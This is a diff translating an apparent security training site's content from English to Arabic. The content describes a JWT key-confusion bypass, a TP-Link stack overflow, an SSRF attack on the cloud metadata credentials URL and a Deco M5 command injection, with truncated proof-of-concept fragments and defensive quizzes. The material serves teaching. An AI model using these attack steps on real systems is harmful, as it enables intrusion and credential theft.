@@ -851,34 +851,34 @@
             <!-- Left Navigation Directory (Tree Menu) -->
             <div class="research-sidebar">
               <div class="research-menu-section">
-                <div class="research-menu-header">🎓 CVE Academy</div>
+                <div class="research-menu-header">🎓 أكاديمية CVE</div>
                 <div class="research-menu-items">
-                  <button class="research-item active" onclick="loadResearch('cve', 'CVE-2025-1024')">CVE-2025-1024 (JWT Auth)</button>
-                  <button class="research-item" onclick="loadResearch('cve', 'CVE-2025-2048')">CVE-2025-2048 (TP-Link RCE)</button>
-                  <button class="research-item" onclick="loadResearch('cve', 'CVE-2025-4096')">CVE-2025-4096 (SSRF Meta)</button>
+                  <button class="research-item active" onclick="loadResearch('cve', 'CVE-2025-1024')">CVE-2025-1024 (ثغرة JWT)</button>
+                  <button class="research-item" onclick="loadResearch('cve', 'CVE-2025-2048')">CVE-2025-2048 (راوتر TP-Link)</button>
+                  <button class="research-item" onclick="loadResearch('cve', 'CVE-2025-4096')">CVE-2025-4096 (ثغرة SSRF)</button>
                 </div>
               </div>
               <div class="research-menu-section">
-                <div class="research-menu-header">📶 Router Research</div>
+                <div class="research-menu-header">📶 أبحاث أجهزة الراوتر</div>
                 <div class="research-menu-items">
-                  <button class="research-item" onclick="loadResearch('router', 'deco-m5')">TP-Link Deco M5 Analysis</button>
+                  <button class="research-item" onclick="loadResearch('router', 'deco-m5')">تحليل راوتر TP-Link Deco M5</button>
                 </div>
               </div>
               <div class="research-menu-section">
-                <div class="research-menu-header">🔍 Interactive Tools</div>
+                <div class="research-menu-header">🔍 أدوات تفاعلية</div>
                 <div class="research-menu-items">
-                  <button class="research-item" onclick="loadResearch('tools', 'cvss-calc')">CVSS v3.1 Calculator</button>
-                  <button class="research-item" onclick="loadResearch('tools', 'timeline')">Vulnerability Timeline</button>
+                  <button class="research-item" onclick="loadResearch('tools', 'cvss-calc')">حاسبة ثغرات CVSS v3.1</button>
+                  <button class="research-item" onclick="loadResearch('tools', 'timeline')">مسار زمن اكتشاف الثغرات</button>
                 </div>
               </div>
               <div class="research-menu-section">
-                <div class="research-menu-header">📝 Exploit Walkthroughs</div>
+                <div class="research-menu-header">📝 شروحات واستغلال الثغرات</div>
                 <div class="research-menu-items">
-                  <button class="research-item" onclick="loadResearch('walkthrough', 'nmap-notes')">Nmap Scan Deep Dive</button>
-                  <button class="research-item" onclick="loadResearch('walkthrough', 'xss-basics')">Cross-Site Scripting (XSS)</button>
-                  <button class="research-item" onclick="loadResearch('walkthrough', 'linux-privesc')">Linux Privilege Escalation</button>
-                  <button class="research-item" onclick="loadResearch('walkthrough', 'burp-suite')">Burp Suite Pro Tips</button>
-                  <button class="research-item" onclick="loadResearch('walkthrough', 'feroxbuster')">Feroxbuster Discovery</button>
+                  <button class="research-item" onclick="loadResearch('walkthrough', 'nmap-notes')">فحص الشبكات بـ Nmap</button>
+                  <button class="research-item" onclick="loadResearch('walkthrough', 'xss-basics')">ثغرات حقن النصوص (XSS)</button>
+                  <button class="research-item" onclick="loadResearch('walkthrough', 'linux-privesc')">تصعيد صلاحيات Linux</button>
+                  <button class="research-item" onclick="loadResearch('walkthrough', 'burp-suite')">أسرار واحتراف Burp Suite</button>
+                  <button class="research-item" onclick="loadResearch('walkthrough', 'feroxbuster')">كشف المجلدات بـ Feroxbuster</button>
                 </div>
               </div>
             </div>
@@ -21820,48 +21820,48 @@ function exitSimulator() {
     const researchData = {
       cve: {
         'CVE-2025-1024': {
-          title: "JWT Authentication Bypass",
+          title: "تخطي مصادقة JWT (JWT Auth Bypass)",
           severity: "CRITICAL",
           score: "9.8",
           vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
           tabs: {
             details: `
-              <h3>Description</h3>
-              <p>A critical vulnerability in JWT signature verification allows remote attackers to bypass authentication by exploiting a key confusion vulnerability. The application fails to validate the algorithm header (HMAC vs RSA), allowing attackers to sign tokens with the server's public key using HS256.</p>
+              <h3>الوصف</h3>
+              <p>ثغرة أمنية حرجة في التحقق من توقيع JWT تتيح للمهاجمين عن بُعد تجاوز عملية المصادقة بالكامل عن طريق استغلال ارتباك المفاتيح (Key Confusion). يفشل التطبيق في التحقق من خوارزمية التوقيع (HMAC مقابل RSA)، مما يسمح للمهاجمين بتوقيع التوكنات باستخدام المفتاح العام للخادم عبر خوارزمية HS256.</p>
               <div style="margin-top: 15px;">
-                <strong>Impact:</strong> Complete authentication bypass and administrative privilege escalation.
+                <strong>الأثر:</strong> تخطي كامل للمصادقة وتصعيد الصلاحيات إلى مدير النظام (Administrator).
               </div>
             `,
             flow: `
-              <h3>Attack Flow Visualizer</h3>
+              <h3>محاكي مسار الهجوم</h3>
               <div class="attack-flow-visual">
                 <div class="flow-step">
                   <div class="flow-step-number">1</div>
                   <div class="flow-step-body">
-                    <h4>Reconnaissance</h4>
-                    <p>Attacker retrieves the server's public key (often exposed via /.well-known/jwks.json or certificate metadata).</p>
+                    <h4>الاستطلاع (Reconnaissance)</h4>
+                    <p>يستخرج المهاجم المفتاح العام للخادم (غالباً ما يكون مكشوفاً عبر /.well-known/jwks.json أو معلومات الشهادة).</p>
                   </div>
                 </div>
                 <div class="flow-arrow">↓</div>
                 <div class="flow-step">
                   <div class="flow-step-number">2</div>
                   <div class="flow-step-body">
-                    <h4>Token Forgery</h4>
-                    <p>Attacker crafts a JWT header setting "alg": "HS256" and payload "user": "admin", then signs the token using the server's RSA public key as the HMAC shared secret.</p>
+                    <h4>تزوير التوكن (Token Forgery)</h4>
+                    <p>يقوم المهاجم بإنشاء ترويسة JWT تحتوي على الخوارزمية "alg": "HS256" وبيانات "user": "admin"، ثم يوقع التوكن باستخدام المفتاح العام RSA الخاص بالخادم كأنه سر مشترك لـ HMAC.</p>
                   </div>
                 </div>
                 <div class="flow-arrow">↓</div>
                 <div class="flow-step">
                   <div class="flow-step-number">3</div>
                   <div class="flow-step-body">
-                    <h4>Bypass Execution</h4>
-                    <p>Attacker submits the forged JWT. The server verifies it with HMAC using its public key, matching the forged signature and granting full admin access.</p>
+                    <h4>تجاوز المصادقة</h4>
+                    <p>يرسل المهاجم التوكن المزور. يقوم الخادم بالتحقق من التوقيع عبر خوارزمية HMAC مستخدماً مفتاحه العام، فيتطابق التوقيع ويمنح المهاجم صلاحيات المدير الكاملة.</p>
                   </div>
                 </div>
               </div>
             `,
             poc: `
-              <h3>Proof of Concept (Python)</h3>
+              <h3>إثبات المفهوم (Python)</h3>
               <div style="position: relative;">
                 <button class="btn-copy-code" onclick="copyResearchCode('poc_jwt_code')">Copy</button>
                 <pre id="poc_jwt_code" style="background: rgba(0,0,0,0.5); padding: 15px; border-radius: 6px; overflow-x: auto; font-family: 'Fira Code', monospace; font-size: 0.8rem; color: #50fa7b;">import jwt
@@ -21884,60 +21884,60 @@ print(r.text)</pre>
               </div>
             `,
             quiz: `
-              <h3>Knowledge Assessment</h3>
-              <p>How does a developer prevent the Key Confusion vulnerability in JWT libraries?</p>
+              <h3>تقييم المعرفة</h3>
+              <p>كيف يمنع المطور ثغرة ارتباك المفاتيح (Key Confusion) في مكتبات JWT؟</p>
               <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 15px;">
-                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">A) Disable signature verification for public routes</button>
-                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, true)">B) Explicitly specify allowed algorithms when decoding (e.g., ['RS256'])</button>
-                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">C) Use longer RSA keys (4096-bit)</button>
+                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">أ) تعطيل التحقق من التوقيع للمسارات العامة</button>
+                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, true)">ب) تحديد الخوارزميات المسموح بها صراحةً عند فك التشفير (مثل ['RS256'])</button>
+                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">ج) استخدام مفاتيح RSA أطول (4096-bit)</button>
               </div>
               <div class="quiz-feedback" style="margin-top: 15px; font-weight: bold; min-height: 20px;"></div>
             `
           }
         },
         'CVE-2025-2048': {
-          title: "TP-Link WAN Remote Code Execution",
+          title: "ثغرة تنفيذ الأوامر عن بعد في راوتر TP-Link (TP-Link WAN RCE)",
           severity: "CRITICAL",
           score: "9.8",
           vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
           tabs: {
             details: `
-              <h3>Description</h3>
-              <p>A buffer overflow vulnerability in the WAN-facing web interface of multiple TP-Link router firmware versions allows remote unauthenticated attackers to execute arbitrary commands by sending specially crafted HTTP headers during DHCP negotiation or setup.</p>
+              <h3>الوصف</h3>
+              <p>ثغرة فيضان مخزن المؤقت (Buffer Overflow) في واجهة الويب المقابلة للشبكة الخارجية (WAN) في إصدارات متعددة من راوتر TP-Link تسمح للمهاجمين غير المصرح لهم بتنفيذ أوامر عشوائية عن طريق إرسال ترويسات HTTP مصممة خصيصاً أثناء عملية إعداد DHCP أو الإعداد الأولي.</p>
               <div style="margin-top: 15px;">
-                <strong>Impact:</strong> Full remote system compromise (root shell access) on WAN interface.
+                <strong>الأثر:</strong> اختراق كامل للنظام والحصول على صلاحية جذور النظام (Root shell) عبر واجهة الشبكة الخارجية WAN.
               </div>
             `,
             flow: `
-              <h3>Attack Flow Visualizer</h3>
+              <h3>محاكي مسار الهجوم</h3>
               <div class="attack-flow-visual">
                 <div class="flow-step">
                   <div class="flow-step-number">1</div>
                   <div class="flow-step-body">
-                    <h4>Header Injection</h4>
-                    <p>Attacker sends a large HTTP Host header exceeding 1024 bytes containing shellcode and a return address overwrite.</p>
+                    <h4>حقن الترويسة (Header Injection)</h4>
+                    <p>يرسل المهاجم ترويسة HTTP Host ضخمة تتجاوز 1024 بايت تحتوي على كود الآلة (shellcode) وتجاوز لعنوان الرجوع (return address).</p>
                   </div>
                 </div>
                 <div class="flow-arrow">↓</div>
                 <div class="flow-step">
                   <div class="flow-step-number">2</div>
                   <div class="flow-step-body">
-                    <h4>Stack Buffer Overflow</h4>
-                    <p>The parser copies the Host header using standard strcpy without boundary checks, overwriting the return address on the stack.</p>
+                    <h4>فيضان المكدس (Stack Buffer Overflow)</h4>
+                    <p>تقوم دالة المعالجة بنسخ الترويسة باستخدام دالة <code>strcpy</code> العادية بدون التحقق من الحجم، مما يؤدي لتخطي حدود مكدس الذاكرة والكتابة فوق عنوان الرجوع.</p>
                   </div>
                 </div>
                 <div class="flow-arrow">↓</div>
                 <div class="flow-step">
                   <div class="flow-step-number">3</div>
                   <div class="flow-step-body">
-                    <h4>Execution Hijack</h4>
-                    <p>When the parsing function returns, it jumps to the attacker's shellcode in memory, spawning a root shell pointing back to the attacker.</p>
+                    <h4>اختطاف التنفيذ</h4>
+                    <p>عندما تنتهي دالة المعالجة وتعود للتنفيذ، فإنها تقفز إلى كود الآلة (shellcode) الذي وضعه المهاجم في الذاكرة، مما يفتح منفذ تحكم بصلاحية جذور النظام (Root shell) للمهاجم.</p>
                   </div>
                 </div>
               </div>
             `,
             poc: `
-              <h3>Proof of Concept (Raw Payload)</h3>
+              <h3>إثبات المفهوم (طلب HTTP خام)</h3>
               <div style="position: relative;">
                 <button class="btn-copy-code" onclick="copyResearchCode('poc_tplink_code')">Copy</button>
                 <pre id="poc_tplink_code" style="background: rgba(0,0,0,0.5); padding: 15px; border-radius: 6px; overflow-x: auto; font-family: 'Fira Code', monospace; font-size: 0.8rem; color: #ff5555;">GET / HTTP/1.1
@@ -21947,60 +21947,60 @@ Accept: */*</pre>
               </div>
             `,
             quiz: `
-              <h3>Knowledge Assessment</h3>
-              <p>Which function is safer to use in C/C++ to prevent buffer overflows?</p>
+              <h3>تقييم المعرفة</h3>
+              <p>أي من الدوال التالية تعتبر آمنة للاستخدام في لغة C/C++ لمنع ثغرات فيضان الذاكرة؟</p>
               <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 15px;">
-                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">A) strcpy()</button>
-                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, true)">B) strncpy() / strlcpy()</button>
-                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">C) strcat()</button>
+                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">أ) strcpy()</button>
+                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, true)">ب) strncpy() / strlcpy()</button>
+                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">ج) strcat()</button>
               </div>
               <div class="quiz-feedback" style="margin-top: 15px; font-weight: bold; min-height: 20px;"></div>
             `
           }
         },
         'CVE-2025-4096': {
-          title: "SSRF in Kubernetes Metadata API",
+          title: "ثغرة SSRF في واجهة Kubernetes Metadata",
           severity: "HIGH",
           score: "8.6",
           vector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N",
           tabs: {
             details: `
-              <h3>Description</h3>
-              <p>An Server-Side Request Forgery (SSRF) vulnerability allows authenticated users to make the server send HTTP requests to internal metadata endpoints (e.g., http://169.254.169.254) using a PDF generation feature that accepts user-supplied external resource links.</p>
+              <h3>الوصف</h3>
+              <p>ثغرة تزوير الطلبات من جانب الخادم (SSRF) تتيح للمستخدمين المصرح لهم إجبار الخادم على إرسال طلبات HTTP داخلية إلى روابط حساسة (مثل http://169.254.169.254) باستخدام ميزة إنشاء ملفات PDF التي تقبل روابط خارجية لصور أو مصادر من المستخدم.</p>
               <div style="margin-top: 15px;">
-                <strong>Impact:</strong> Leakage of cloud provider IAM tokens and service account secrets.
+                <strong>الأثر:</strong> تسريب بيانات اعتماد سحابة Cloud (IAM tokens) وحسابات الخدمة الحساسة.
               </div>
             `,
             flow: `
-              <h3>Attack Flow Visualizer</h3>
+              <h3>محاكي مسار الهجوم</h3>
               <div class="attack-flow-visual">
                 <div class="flow-step">
                   <div class="flow-step-number">1</div>
                   <div class="flow-step-body">
-                    <h4>Target Request</h4>
-                    <p>Attacker submits a request to generate a PDF, passing <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> as an image source link.</p>
+                    <h4>طلب الرابط الداخلي</h4>
+                    <p>يرسل المهاجم طلباً لإنشاء ملف PDF ويمرر الرابط <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> كمسار لصورة الشعار.</p>
                   </div>
                 </div>
                 <div class="flow-arrow">↓</div>
                 <div class="flow-step">
                   <div class="flow-step-number">2</div>
                   <div class="flow-step-body">
-                    <h4>Internal Fetch</h4>
-                    <p>The backend server processes the PDF generation, trusts the URL, and fetches the AWS metadata endpoint from its internal interface.</p>
+                    <h4>الجلب الداخلي من السيرفر</h4>
+                    <p>يقوم الخادم الخلفي بمعالجة ملف الـ PDF وجلب الرابط الداخلي ظناً منه أنه رابط خارجي عادي، متجاوزاً الجدران النارية الخارجية.</p>
                   </div>
                 </div>
                 <div class="flow-arrow">↓</div>
                 <div class="flow-step">
                   <div class="flow-step-number">3</div>
                   <div class="flow-step-body">
-                    <h4>IAM Token Leakage</h4>
-                    <p>The server embeds the AWS IAM credentials response within the PDF binary, which the attacker downloads and extracts to gain AWS access.</p>
+                    <h4>تسريب البيانات الحساسة</h4>
+                    <p>يتم حقن محتوى استجابة الـ AWS IAM credentials داخل ملف الـ PDF الناتج، ليقوم المهاجم بتحميل الملف واستخراج البيانات الحساسة منه.</p>
                   </div>
                 </div>
               </div>
             `,
             poc: `
-              <h3>Proof of Concept (HTTP Request)</h3>
+              <h3>إثبات المفهوم (طلب HTTP)</h3>
               <div style="position: relative;">
                 <button class="btn-copy-code" onclick="copyResearchCode('poc_ssrf_code')">Copy</button>
                 <pre id="poc_ssrf_code" style="background: rgba(0,0,0,0.5); padding: 15px; border-radius: 6px; overflow-x: auto; font-family: 'Fira Code', monospace; font-size: 0.8rem; color: #ffb86c;">POST /api/v1/generate-report HTTP/1.1
@@ -22014,12 +22014,12 @@ Content-Type: application/json
               </div>
             `,
             quiz: `
-              <h3>Knowledge Assessment</h3>
-              <p>Which method is the most secure defense against SSRF?</p>
+              <h3>تقييم المعرفة</h3>
+              <p>ما هي الطريقة الأكثر أماناً للحماية من ثغرات تزوير الطلبات من الخادم (SSRF)؟</p>
               <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 15px;">
-                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">A) Blacklisting "169.254.169.254" in URL validation</button>
-                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, true)">B) Enforcing a strict whitelist of allowed domains and using isolated network zones</button>
-                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">C) Using HTTP POST instead of GET for external requests</button>
+                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">أ) وضع "169.254.169.254" في قائمة الحظر (Blacklist)</button>
+                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, true)">ب) استخدام قائمة السماح الصارمة (Whitelist) وعزل الشبكة داخلياً</button>
+                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">ج) استخدام طلبات POST بدلاً من GET للطلبات الخارجية</button>
               </div>
               <div class="quiz-feedback" style="margin-top: 15px; font-weight: bold; min-height: 20px;"></div>
             `
@@ -22028,50 +22028,50 @@ Content-Type: application/json
       },
       router: {
         'deco-m5': {
-          title: "TP-Link Deco M5 Architecture Analysis",
+          title: "تحليل معمارية ونظام TP-Link Deco M5",
           tabs: {
             details: `
-              <h3>Deco M5 Hardware & Architecture</h3>
-              <p>The Deco M5 router features a Qualcomm IPQ4019 SoC, running an embedded Linux kernel version 3.18.44. The system relies on a SquashFS read-only root filesystem with a dynamic JFFS2 partition for system configuration and user settings.</p>
+              <h3>معمارية راوتر Deco M5</h3>
+              <p>يحتوي راوتر Deco M5 على شريحة المعالجة Qualcomm IPQ4019 SoC، ويعمل بنواة نظام لينكس مدمج (embedded Linux) بالإصدار 3.18.44. يعتمد النظام على نظام ملفات SquashFS للقراءة فقط مع بارتشن JFFS2 ديناميكي لحفظ إعدادات النظام والمستخدم.</p>
               <div style="margin-top: 15px;">
-                <strong>Services Analyzed:</strong>
+                <strong>الخدمات التي تم تحليلها:</strong>
                 <ul>
-                  <li><strong>uhttpd:</strong> Lightweight HTTP server handling the web admin panel.</li>
-                  <li><strong>tdpd:</strong> TP-Link Device Protocol daemon, responsible for inter-device LAN communication.</li>
-                  <li><strong>dhcpd:</strong> DNSMasq configuration providing local network address allocation.</li>
+                  <li><strong>uhttpd:</strong> خادم ويب خفيف لإدارة لوحة تحكم الراوتر.</li>
+                  <li><strong>tdpd:</strong> خدمة بروتوكول أجهزة TP-Link المسؤولة عن التواصل بين الأجهزة داخل الشبكة المحلية LAN.</li>
+                  <li><strong>dhcpd:</strong> إعدادات DNSMasq لتوزيع العناوين في الشبكة المحلية.</li>
                 </ul>
               </div>
             `,
             flow: `
-              <h3>Vulnerability Research Mapping</h3>
+              <h3>خريطة فحص الثغرات</h3>
               <div class="attack-flow-visual">
                 <div class="flow-step">
                   <div class="flow-step-number">1</div>
                   <div class="flow-step-body">
-                    <h4>Firmware Extraction</h4>
-                    <p>Decrypted flash memory dump using <code>binwalk -e DecoM5_V1_2025.bin</code> to isolate squashfs filesystems.</p>
+                    <h4>استخراج نظام الملفات</h4>
+                    <p>قمنا بفك تشفير نسخة الـ flash memory واستخراج نظام الملفات باستخدام أداة <code>binwalk -e DecoM5_V1_2025.bin</code>.</p>
                   </div>
                 </div>
                 <div class="flow-arrow">↓</div>
                 <div class="flow-step">
                   <div class="flow-step-number">2</div>
                   <div class="flow-step-body">
-                    <h4>Binary Decompilation</h4>
-                    <p>Loaded <code>/usr/bin/tdpd</code> daemon in Ghidra. Traced network listening loops on port 20002 UDP.</p>
+                    <h4>هندسة عكسية للبرمجيات</h4>
+                    <p>قمنا بتحليل ملف <code>/usr/bin/tdpd</code> الثنائي داخل أداة Ghidra، وتتبعنا منافذ الاستماع للشبكة على بورت 20002 UDP.</p>
                   </div>
                 </div>
                 <div class="flow-arrow">↓</div>
                 <div class="flow-step">
                   <div class="flow-step-number">3</div>
                   <div class="flow-step-body">
-                    <h4>Vulnerability Identified</h4>
-                    <p>Found a dynamic command execution vector inside a proprietary diagnostic broadcast routine. Unsanitized parameter is directly passed to <code>popen()</code>.</p>
+                    <h4>اكتشاف الثغرة الأمنية</h4>
+                    <p>وجدنا ثغرة حقن أوامر (Command Injection) داخل دالة إرسال تشخيصية خاصة، حيث يتم تمرير المتغير مباشرة إلى دالة <code>popen()</code> دون أي معالجة.</p>
                   </div>
                 </div>
               </div>
             `,
             poc: `
-              <h3>Deco M5 Diagnostic Exploit script</h3>
+              <h3>سكريبت استغلال ثغرة التشخيص في Deco M5</h3>
               <div style="position: relative;">
                 <button class="btn-copy-code" onclick="copyResearchCode('poc_deco_code')">Copy</button>
                 <pre id="poc_deco_code" style="background: rgba(0,0,0,0.5); padding: 15px; border-radius: 6px; overflow-x: auto; font-family: 'Fira Code', monospace; font-size: 0.8rem; color: #50fa7b;">import socket
@@ -22087,12 +22087,12 @@ print("[+] Diagnostic payload sent. Attempting connection to telnet shell...")</
               </div>
             `,
             quiz: `
-              <h3>Knowledge Assessment</h3>
-              <p>Which Linux kernel mechanism protects routers against standard heap/stack execution?</p>
+              <h3>تقييم المعرفة</h3>
+              <p>ما هي آلية حماية نواة لينكس (Linux Kernel) التي تحمي الراوتر من تنفيذ الأكواد في الذاكرة؟</p>
               <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 15px;">
-                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">A) AppArmor profiles</button>
-                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, true)">B) NX/DEP (No-Execute) & ASLR (Address Space Layout Randomization)</button>
-                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">C) Chroot jail setups</button>
+                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">أ) جدران AppArmor لحظر الوصول</button>
+                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, true)">ب) تقنيات NX/DEP (منع تنفيذ الذاكرة) و ASLR (عشوائية توزيع مساحة الذاكرة)</button>
+                <button class="quiz-opt-btn" onclick="evaluateQuizOption(this, false)">ج) استخدام بيئة Chroot لعزل العمليات</button>
               </div>
               <div class="quiz-feedback" style="margin-top: 15px; font-weight: bold; min-height: 20px;"></div>
             `
@@ -22101,111 +22101,111 @@ print("[+] Diagnostic payload sent. Attempting connection to telnet shell...")</
       },
       tools: {
         'cvss-calc': {
-          title: "CVSS v3.1 Interactive Calculator",
+          title: "حاسبة تقييم الثغرات التفاعلية CVSS v3.1",
           tabs: {
             details: `
-              <h3>CVSS Base Score Calculator</h3>
-              <p>Use this interactive tool to determine the severity rating of security vulnerabilities based on the official FIRST CVSS v3.1 framework metrics.</p>
+              <h3>حاسبة نقاط CVSS الأساسية</h3>
+              <p>استخدم هذه الأداة التفاعلية لتحديد درجة خطورة الثغرات الأمنية بناءً على معايير إطار العمل الرسمي CVSS v3.1 من منظمة FIRST.</p>
               
               <div class="calc-grid" style="display: grid; grid-template-columns: 1fr; gap: 15px; margin-top: 20px;">
                 <div class="calc-metric-row">
                   <div class="calc-metric-label">
-                    <strong>Attack Vector (AV)</strong>
-                    <span>Where can the exploit be executed from?</span>
+                    <strong>ناقل الهجوم (AV)</strong>
+                    <span>من أين يمكن تنفيذ الاختراق؟</span>
                   </div>
                   <div class="calc-btn-group" data-metric="AV">
-                    <button class="calc-btn active" data-val="N" data-weight="0.85" onclick="selectCvssMetric(this)">Network (0.85)</button>
-                    <button class="calc-btn" data-val="A" data-weight="0.62" onclick="selectCvssMetric(this)">Adjacent (0.62)</button>
-                    <button class="calc-btn" data-val="L" data-weight="0.55" onclick="selectCvssMetric(this)">Local (0.55)</button>
-                    <button class="calc-btn" data-val="P" data-weight="0.20" onclick="selectCvssMetric(this)">Physical (0.20)</button>
+                    <button class="calc-btn active" data-val="N" data-weight="0.85" onclick="selectCvssMetric(this)">عبر الشبكة (0.85)</button>
+                    <button class="calc-btn" data-val="A" data-weight="0.62" onclick="selectCvssMetric(this)">شبكة مجاورة (0.62)</button>
+                    <button class="calc-btn" data-val="L" data-weight="0.55" onclick="selectCvssMetric(this)">محلي (0.55)</button>
+                    <button class="calc-btn" data-val="P" data-weight="0.20" onclick="selectCvssMetric(this)">فيزيائي (0.20)</button>
                   </div>
                 </div>
                 
                 <div class="calc-metric-row">
                   <div class="calc-metric-label">
-                    <strong>Attack Complexity (AC)</strong>
-                    <span>Are there special conditions required?</span>
+                    <strong>تعقيد الهجوم (AC)</strong>
+                    <span>هل يتطلب شروطاً خاصة لتنفيذه؟</span>
                   </div>
                   <div class="calc-btn-group" data-metric="AC">
-                    <button class="calc-btn active" data-val="L" data-weight="0.77" onclick="selectCvssMetric(this)">Low (0.77)</button>
-                    <button class="calc-btn" data-val="H" data-weight="0.44" onclick="selectCvssMetric(this)">High (0.44)</button>
+                    <button class="calc-btn active" data-val="L" data-weight="0.77" onclick="selectCvssMetric(this)">منخفض (0.77)</button>
+                    <button class="calc-btn" data-val="H" data-weight="0.44" onclick="selectCvssMetric(this)">مرتفع (0.44)</button>
                   </div>
                 </div>
 
                 <div class="calc-metric-row">
                   <div class="calc-metric-label">
-                    <strong>Privileges Required (PR)</strong>
-                    <span>Does the attacker need authorization?</span>
+                    <strong>الصلاحيات المطلوبة (PR)</strong>
+                    <span>هل يحتاج المهاجم إلى صلاحيات تسجيل دخول؟</span>
                   </div>
                   <div class="calc-btn-group" data-metric="PR">
-                    <button class="calc-btn active" data-val="N" data-weight="0.85" onclick="selectCvssMetric(this)">None (0.85)</button>
-                    <button class="calc-btn" data-val="L" data-weight="0.62" onclick="selectCvssMetric(this)">Low (0.62)</button>
-                    <button class="calc-btn" data-val="H" data-weight="0.27" onclick="selectCvssMetric(this)">High (0.27)</button>
+                    <button class="calc-btn active" data-val="N" data-weight="0.85" onclick="selectCvssMetric(this)">لا يوجد (0.85)</button>
+                    <button class="calc-btn" data-val="L" data-weight="0.62" onclick="selectCvssMetric(this)">منخفضة (0.62)</button>
+                    <button class="calc-btn" data-val="H" data-weight="0.27" onclick="selectCvssMetric(this)">مرتفعة (0.27)</button>
                   </div>
                 </div>
 
                 <div class="calc-metric-row">
                   <div class="calc-metric-label">
-                    <strong>User Interaction (UI)</strong>
-                    <span>Does a victim need to perform an action?</span>
+                    <strong>تفاعل المستخدم (UI)</strong>
+                    <span>هل يتطلب الهجوم تفاعلاً من الضحية؟</span>
                   </div>
                   <div class="calc-btn-group" data-metric="UI">
-                    <button class="calc-btn active" data-val="N" data-weight="0.85" onclick="selectCvssMetric(this)">None (0.85)</button>
-                    <button class="calc-btn" data-val="R" data-weight="0.62" onclick="selectCvssMetric(this)">Required (0.62)</button>
+                    <button class="calc-btn active" data-val="N" data-weight="0.85" onclick="selectCvssMetric(this)">لا يوجد (0.85)</button>
+                    <button class="calc-btn" data-val="R" data-weight="0.62" onclick="selectCvssMetric(this)">مطلوب (0.62)</button>
                   </div>
                 </div>
 
                 <div class="calc-metric-row">
                   <div class="calc-metric-label">
-                    <strong>Scope (S)</strong>
-                    <span>Does the impact extend beyond the vulnerable component?</span>
+                    <strong>النطاق (S)</strong>
+                    <span>هل يتعدى أثر الثغرة النظام المصاب إلى أنظمة أخرى؟</span>
                   </div>
                   <div class="calc-btn-group" data-metric="S">
-                    <button class="calc-btn active" data-val="U" data-weight="0" onclick="selectCvssMetric(this)">Unchanged</button>
-                    <button class="calc-btn" data-val="C" data-weight="1" onclick="selectCvssMetric(this)">Changed</button>
+                    <button class="calc-btn active" data-val="U" data-weight="0" onclick="selectCvssMetric(this)">غير متغير</button>
+                    <button class="calc-btn" data-val="C" data-weight="1" onclick="selectCvssMetric(this)">متغير</button>
                   </div>
                 </div>
 
                 <div class="calc-metric-row">
                   <div class="calc-metric-label">
-                    <strong>Confidentiality (C)</strong>
-                    <span>What level of data read access is gained?</span>
+                    <strong>سرية البيانات (C)</strong>
+                    <span>ما هو حجم البيانات التي يمكن للمهاجم قراءتها؟</span>
                   </div>
                   <div class="calc-btn-group" data-metric="C">
-                    <button class="calc-btn active" data-val="H" data-weight="0.56" onclick="selectCvssMetric(this)">High (0.56)</button>
-                    <button class="calc-btn" data-val="L" data-weight="0.22" onclick="selectCvssMetric(this)">Low (0.22)</button>
-                    <button class="calc-btn" data-val="N" data-weight="0" onclick="selectCvssMetric(this)">None (0)</button>
+                    <button class="calc-btn active" data-val="H" data-weight="0.56" onclick="selectCvssMetric(this)">كاملة (0.56)</button>
+                    <button class="calc-btn" data-val="L" data-weight="0.22" onclick="selectCvssMetric(this)">جزئية (0.22)</button>
+                    <button class="calc-btn" data-val="N" data-weight="0" onclick="selectCvssMetric(this)">لا يوجد (0)</button>
                   </div>
                 </div>
 
                 <div class="calc-metric-row">
                   <div class="calc-metric-label">
-                    <strong>Integrity (I)</strong>
-                    <span>What level of data modification is gained?</span>
+                    <strong>سلامة البيانات (I)</strong>
+                    <span>ما هو حجم البيانات التي يمكن تعديلها أو حذفها؟</span>
                   </div>
                   <div class="calc-btn-group" data-metric="I">
-                    <button class="calc-btn active" data-val="H" data-weight="0.56" onclick="selectCvssMetric(this)">High (0.56)</button>
-                    <button class="calc-btn" data-val="L" data-weight="0.22" onclick="selectCvssMetric(this)">Low (0.22)</button>
-                    <button class="calc-btn" data-val="N" data-weight="0" onclick="selectCvssMetric(this)">None (0)</button>
+                    <button class="calc-btn active" data-val="H" data-weight="0.56" onclick="selectCvssMetric(this)">كاملة (0.56)</button>
+                    <button class="calc-btn" data-val="L" data-weight="0.22" onclick="selectCvssMetric(this)">جزئية (0.22)</button>
